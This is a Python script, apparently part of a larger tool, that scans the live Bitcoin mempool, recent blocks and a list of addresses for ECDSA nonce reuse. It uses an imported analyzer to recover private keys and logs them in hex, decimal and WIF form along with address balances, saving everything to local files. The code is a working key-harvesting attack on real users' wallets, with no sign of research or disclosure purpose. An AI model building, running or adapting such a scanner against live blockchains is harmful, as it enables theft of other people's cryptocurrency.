
#!/usr/bin/env python3
import time
import logging
import requests
import json
from typing import Dict, List, Optional
from btc_analyzer import BTCAnalyzer
from address_list import ADDRESSES_TO_CHECK
import threading
import queue
import random
from logging_config import initialize_all_loggers

# Initialize comprehensive logging
loggers = initialize_all_loggers()
logger = loggers['main']
scanner_logger = loggers['scanner']
key_recovery_logger = loggers['key_recovery']

class ContinuousScanner:
    def __init__(self):
        self.analyzer = BTCAnalyzer()
        self.found_weak_sigs = []
        self.scan_count = 0
        self.running = True
        
    def scan_mempool_continuously(self):
        """Continuously scan Bitcoin mempool for weak signatures"""
        scanner_logger.info("🔍 Starting continuous mempool scanning for weak signatures...")
        
        while self.running:
            try:
                # Get unconfirmed transactions
                scanner_logger.debug("Fetching mempool transactions...")
                response = requests.get(
                    'https://blockchain.info/unconfirmed-transactions?format=json',
                    timeout=10
                )
                
                if response.status_code == 200:
                    mempool_data = response.json()
                    transactions = mempool_data.get('txs', [])
                    
                    scanner_logger.info(f"📊 Scanning {len(transactions)} mempool transactions...")
                    
                    for tx in transactions:
                        if not self.running:
                            break
                            
                        tx_id = tx.get('hash')
                        if tx_id:
                            self.scan_count += 1
                            scanner_logger.debug(f"Analyzing mempool transaction: {tx_id}")
                            weak_result = self.analyze_transaction_for_weakness(tx_id)
                            
                            if weak_result:
                                scanner_logger.critical(f"🚨 WEAK SIGNATURE FOUND! TX: {tx_id}")
                                self.found_weak_sigs.append(weak_result)
                                self.display_vulnerability(weak_result)
                                
                                # Don't stop - continue searching for more
                                scanner_logger.info("🔄 Continuing search for more vulnerabilities...")
                
                # Brief pause before next scan
                time.sleep(2)
                
            except Exception as e:
                logger.error(f"❌ Mempool scan error: {e}")
                time.sleep(5)
    
    def scan_recent_blocks(self):
        """Scan recent blocks for weak signatures"""
        logger.info("🔍 Scanning recent blocks for weak signatures...")
        
        while self.running:
            try:
                # Get latest block
                response = requests.get('https://blockchain.info/latestblock', timeout=10)
                if response.status_code == 200:
                    latest_block = response.json()
                    block_hash = latest_block.get('hash')
                    
                    # Get block transactions
                    block_response = requests.get(
                        f'https://blockchain.info/rawblock/{block_hash}',
                        timeout=15
                    )
                    
                    if block_response.status_code == 200:
                        block_data = block_response.json()
                        transactions = block_data.get('tx', [])
                        
                        logger.info(f"📦 Scanning block {block_hash[:16]}... with {len(transactions)} transactions")
                        
                        for tx in transactions[:50]:  # Scan first 50 transactions
                            if not self.running:
                                break
                                
                            tx_id = tx.get('hash')
                            if tx_id:
                                self.scan_count += 1
                                weak_result = self.analyze_transaction_for_weakness(tx_id)
                                
                                if weak_result:
                                    logger.critical(f"🚨 WEAK SIGNATURE FOUND! TX: {tx_id}")
                                    self.found_weak_sigs.append(weak_result)
                                    self.display_vulnerability(weak_result)
                
                time.sleep(30)  # Wait for next block
                
            except Exception as e:
                logger.error(f"❌ Block scan error: {e}")
                time.sleep(10)
    
    def scan_known_addresses(self):
        """Continuously scan known vulnerable addresses"""
        logger.info("🔍 Scanning known addresses for weak signatures...")
        
        while self.running:
            for address in ADDRESSES_TO_CHECK:
                if not self.running:
                    break
                    
                try:
                    logger.info(f"🏠 Analyzing address: {address}")
                    results = self.analyzer.analyze_address(address)
                    
                    if results.get('weak_signatures'):
                        for weak_sig in results['weak_signatures']:
                            if weak_sig.get('type') == 'reused_r':
                                logger.critical(f"🚨 NONCE REUSE FOUND! Address: {address}")
                                self.found_weak_sigs.append({
                                    'address': address,
                                    'weakness': weak_sig,
                                    'full_results': results
                                })
                                self.display_vulnerability({
                                    'address': address,
                                    'weakness': weak_sig,
                                    'full_results': results
                                })
                    
                    # Small delay between addresses
                    time.sleep(1)
                    
                except Exception as e:
                    logger.error(f"❌ Error analyzing address {address}: {e}")
                    continue
            
            # Completed one full cycle
            logger.info("🔄 Completed address scan cycle, restarting...")
            time.sleep(5)
    
    def analyze_transaction_for_weakness(self, tx_id: str) -> Optional[Dict]:
        """Analyze a single transaction for weak signatures"""
        try:
            results = self.analyzer.analyze_transaction(tx_id)
            
            if 'error' in results:
                return None
            
            # Check for nonce reuse
            weak_signatures = results.get('weak_signatures', [])
            for weak_sig in weak_signatures:
                if weak_sig.get('type') == 'reused_r':
                    logger.warning(f"⚠️  Potential nonce reuse in {tx_id}")
                    
                    # Try to recover private key
                    if 'all_signatures' in weak_sig and len(weak_sig['all_signatures']) >= 2:
                        return {
                            'tx_id': tx_id,
                            'weakness_type': 'nonce_reuse',
                            'weakness': weak_sig,
                            'full_results': results
                        }
            
            # Check for recovered private keys
            if results.get('private_keys_found', 0) > 0:
                logger.warning(f"⚠️  Private key recovered from {tx_id}")
                return {
                    'tx_id': tx_id,
                    'weakness_type': 'private_key_recovered',
                    'full_results': results
                }
            
            return None
            
        except Exception as e:
            logger.debug(f"Error analyzing {tx_id}: {e}")
            return None
    
    def display_vulnerability(self, result: Dict):
        """Display found vulnerability details"""
        logger.critical("="*60)
        logger.critical("🚨 VULNERABILITY FOUND! 🚨")
        logger.critical("="*60)
        
        if 'tx_id' in result:
            logger.critical(f"Transaction ID: {result['tx_id']}")
        
        if 'address' in result:
            logger.critical(f"Address: {result['address']}")
        
        weakness = result.get('weakness', {})
        if weakness:
            logger.critical(f"Weakness Type: {weakness.get('type', 'Unknown')}")
            logger.critical(f"Details: {weakness.get('details', 'No details')}")
            
            if weakness.get('type') == 'reused_r':
                logger.critical(f"Reused R value: {weakness.get('r', 'N/A')}")
                logger.critical(f"Reuse count: {weakness.get('reuse_count', 'Unknown')}")
        
        # Try to extract recovered private keys
        full_results = result.get('full_results', {})
        if full_results.get('private_keys_found', 0) > 0:
            for weak_sig in full_results.get('weak_signatures', []):
                if weak_sig.get('type') == 'recovered_private_key':
                    logger.critical("🔓 RECOVERED PRIVATE KEY DETAILS:")
                    logger.critical(f"🔑 Private Key (Hex): {weak_sig.get('private_key_hex', 'N/A')}")
                    logger.critical(f"🔢 Private Key (Decimal): {weak_sig.get('private_key_decimal', 'N/A')}")
                    logger.critical(f"📝 WIF (Compressed): {weak_sig.get('wif_compressed', 'N/A')}")
                    logger.critical(f"📝 WIF (Uncompressed): {weak_sig.get('wif_uncompressed', 'N/A')}")
                    logger.critical(f"🎯 Primary Address: {weak_sig.get('primary_address', 'N/A')}")
                    logger.critical(f"💰 Primary Balance: {weak_sig.get('primary_balance', 'N/A')} BTC")
                    logger.critical(f"💎 Total Balance: {weak_sig.get('total_balance', 'N/A')} BTC")
                    logger.critical(f"🏷️  Recovery Method: {weak_sig.get('recovery_method', 'N/A')}")
                    
                    # Log all addresses and balances
                    logger.critical("🏠 ALL ADDRESSES AND BALANCES:")
                    if 'all_balances' in weak_sig:
                        for addr_type, addr_info in weak_sig['all_balances'].items():
                            status = "💰" if addr_info['balance'] > 0 else "💸"
                            logger.critical(f"   {addr_type}: {addr_info['address']} - {addr_info['balance']:.8f} BTC {status}")
                    
                    # Save detailed information to file
                    self._save_detailed_recovery(weak_sig, result)
        
        logger.critical("="*60)
        
        # Save to file
        with open('found_vulnerabilities.json', 'a') as f:
            json.dump(result, f, indent=2)
            f.write('\n')
    
    def _save_detailed_recovery(self, weak_sig: Dict, result: Dict):
        """Save detailed recovery information to dedicated files"""
        try:
            import datetime
            
            timestamp = datetime.datetime.now().strftime('%Y%m%d_%H%M%S')
            
            # Save to detailed recovery log
            recovery_entry = {
                'timestamp': datetime.datetime.now().isoformat(),
                'scanner_type': 'continuous',
                'source': result.get('tx_id', result.get('address', 'unknown')),
                'private_key_hex': weak_sig.get('private_key_hex'),
                'private_key_decimal': weak_sig.get('private_key_decimal'),
                'wif_compressed': weak_sig.get('wif_compressed'),
                'wif_uncompressed': weak_sig.get('wif_uncompressed'),
                'primary_address': weak_sig.get('primary_address'),
                'primary_balance': weak_sig.get('primary_balance'),
                'total_balance': weak_sig.get('total_balance'),
                'recovery_method': weak_sig.get('recovery_method'),
                'all_addresses': weak_sig.get('all_addresses', {}),
                'all_balances': weak_sig.get('all_balances', {}),
                'calculation_details': weak_sig.get('calculation_details', {}),
                'full_result': result
            }
            
            with open('continuous_scanner_recoveries.json', 'a') as f:
                json.dump(recovery_entry, f, indent=2)
                f.write('\n')
            
            # Also save in human-readable format
            with open('continuous_scanner_summary.txt', 'a') as f:
                f.write(f"\n{'='*100}\n")
                f.write(f"CONTINUOUS SCANNER RECOVERY #{timestamp}\n")
                f.write(f"{'='*100}\n")
                f.write(f"Source: {result.get('tx_id', result.get('address', 'unknown'))}\n")
                f.write(f"Recovery Method: {weak_sig.get('recovery_method', 'unknown')}\n")
                f.write(f"Private Key: {weak_sig.get('private_key_hex', 'N/A')}\n")
                f.write(f"WIF (Compressed): {weak_sig.get('wif_compressed', 'N/A')}\n")
                f.write(f"WIF (Uncompressed): {weak_sig.get('wif_uncompressed', 'N/A')}\n")
                f.write(f"Primary Address: {weak_sig.get('primary_address', 'N/A')}\n")
                f.write(f"Primary Balance: {weak_sig.get('primary_balance', 0):.8f} BTC\n")
                f.write(f"Total Balance: {weak_sig.get('total_balance', 0):.8f} BTC\n")
                
                f.write(f"\nAll Address Formats:\n")
                for addr_type, addr_info in weak_sig.get('all_balances', {}).items():
                    f.write(f"  {addr_type}: {addr_info['address']} - {addr_info['balance']:.8f} BTC\n")
                
                if 'calculation_details' in weak_sig:
                    f.write(f"\nCalculation Details:\n")
                    for key, value in weak_sig['calculation_details'].items():
                        f.write(f"  {key}: {value}\n")
                
                f.write(f"{'='*100}\n")
                
        except Exception as e:
            logger.error(f"Error saving detailed recovery: {e}")
    
    def start_continuous_scan(self):
        """Start all scanning threads"""
        logger.info("🚀 Starting continuous weak signature scanner...")
        logger.info("🎯 Will not stop until weak signatures are found!")
        
        # Start multiple scanning threads
        threads = [
            threading.Thread(target=self.scan_mempool_continuously, name="Mempool Scanner"),
            threading.Thread(target=self.scan_recent_blocks, name="Block Scanner"),
            threading.Thread(target=self.scan_known_addresses, name="Address Scanner")
        ]
        
        for thread in threads:
            thread.daemon = True
            thread.start()
            logger.info(f"✅ Started {thread.name}")
        
        # Monitor progress
        try:
            while self.running:
                time.sleep(10)
                logger.info(f"📊 Status: {self.scan_count} transactions scanned, {len(self.found_weak_sigs)} vulnerabilities found")
                
                if len(self.found_weak_sigs) > 0:
                    logger.info(f"🎉 Found {len(self.found_weak_sigs)} weak signatures so far!")
        
        except KeyboardInterrupt:
            logger.info("🛑 Stopping scanner...")
            self.running = False

def main():
    scanner = ContinuousScanner()
    
    print("""
🔍 Bitcoin ECDSA Weak Signature Hunter
=====================================
This scanner will continuously search for:
- Nonce reuse vulnerabilities
- Weak ECDSA signatures  
- Private key recovery opportunities

Press Ctrl+C to stop.
""")
    
    scanner.start_continuous_scan()

if __name__ == "__main__":
    main()
